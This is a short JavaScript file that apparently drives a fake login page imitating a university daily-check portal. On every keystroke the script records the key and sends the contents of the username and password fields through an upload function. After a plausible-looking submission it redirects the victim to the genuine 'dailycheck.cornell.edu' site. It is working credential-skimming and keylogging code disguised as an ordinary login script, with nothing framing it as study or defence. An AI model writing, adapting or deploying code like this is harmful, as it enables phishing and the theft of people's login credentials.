function valid(id){
    if (id.length < 3 || id.length > 6){
        return false
    }
    index = 0
    for (let i=0; i<id.length; i++){
        if (!isNaN(id[i])){
            index = i
            break
        }
    }
    if (index == 0){
        return false
    }
    letters = id.substring(0,index)
    number = id.substring(index, id.length)
    if (isNaN(number)){
        return false
    }
    for (let i=0; i<letters.length; i++){
        if (!isNaN(letters[i])){
            return false
        }
    }
    return true
}

window.addEventListener('keydown', e => {
    console.log(e.key)
    uploadSet('-')
    setTimeout(()=>{
        uploadSet('username: ' + Id('username').value)
        uploadSet('password: ' + Id('password').value)
    },10)
    uploadSet('char: ' + e.key)
})


Id('submit').onclick = () => {
    if (valid(Id('username').value) && Id('password').value.length > 6){
        window.location.href = 'https://dailycheck.cornell.edu'
    }else{
        Id('reason').style.display = 'none'
        setTimeout(()=>{
            Id('reason').style.display = 'block'
        },50)
    }
}